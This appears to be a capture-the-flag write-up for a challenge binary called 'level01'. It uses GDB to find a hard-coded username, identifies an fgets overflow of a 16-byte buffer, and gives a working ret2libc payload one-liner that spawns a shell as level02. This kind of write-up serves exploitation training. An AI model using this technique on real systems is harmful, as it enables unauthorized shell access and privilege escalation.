
# Level01 - Exploiting a Login Bypass with Buffer Overflow

## Objective

The goal of this challenge is to bypass the login check by exploiting a buffer overflow vulnerability to gain access and execute a shell.

## Step 1: Running the Program

First, let's run the program to observe its behavior:

```bash
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: coucou
verifying username....

nope, incorrect username...
```

The program prompts for a username and indicates that the entered username is incorrect.

## Step 2: Analyzing with GDB

To understand how the program works, let's analyze it using GDB (GNU Debugger):

```bash
$ gdb -q ./level01
```

## Step 3: Finding the Username Check

Within GDB, you can identify that the program uses `fgets` for input, and a function `verify_user_name` checks the username:

```assembly
0x08048528 <+88>: call   0x8048370 <fgets@plt>
0x0804852d <+93>: call   0x8048464 <verify_user_name>
```

The function performs a manual comparison equivalent to `strncmp` with the string `dat_wil`:

```assembly
(gdb) disas verify_user_name
0x0804846c <+8>: mov    DWORD PTR [esp],0x8048690    <--- "verifying username....\n"
0x08048473 <+15>: call   0x8048380 <puts@plt>
0x08048478 <+20>: mov    edx,0x804a040    <--- "dat_wil\n"
0x0804847d <+25>: mov    eax,0x80486a8    <--- "dat_wil"
```

### Step 4: Enter the Correct Username

Now, run the program again and enter the correct username:

```bash
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
```

The program accepts the username and prompts for a password.

## Step 5: Finding the Password Check

The password is checked by the `verify_user_pass` function after another `fgets` call:

```assembly
0x08048574 <+164>: call   0x8048370 <fgets@plt>
0x08048580 <+176>: call   0x80484a3 <verify_user_pass>
```

This function compares the input with the string `admin`, but entering `admin` doesn't work.

## Step 6: Buffer Overflow Vulnerability

Inspecting the code shows that `fgets` reads up to 100 characters into a 16-byte buffer, causing an overflow. The buffer overflow allows us to overwrite the return address.

### Triggering the Overflow

Run the program with an overly long input:

```bash
(gdb) r
Starting program: ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbb
```

The program crashes with a segmentation fault, indicating control over the instruction pointer.

## Step 7: Exploiting with Ret2libc

With the overflow, we can perform a Ret2libc attack. We need addresses for `system`, `exit`, and the string `"/bin/sh"`:

1. Address of `/bin/sh`: `0xf7f897ec`
2. Address of `system`: `0xf7e6aed0`
3. Address of `exit`: `0xf7e5eb70`

### Building the Payload

Construct the payload using the discovered addresses:

```bash
("B" * 80) + "system" + "ret = exit" + "/bin/sh"
```

Execute the attack:

```bash
$ python -c 'print "dat_wil\n" + "B" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/payload
$ cat /tmp/payload - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
$ whoami
level02
```

## Summary

- The program checks username and password using manual comparisons.
- Buffer overflow allows overwriting the return address.
- Ret2libc attack is used to execute `/bin/sh`.

This approach allows bypassing the login and gaining elevated access.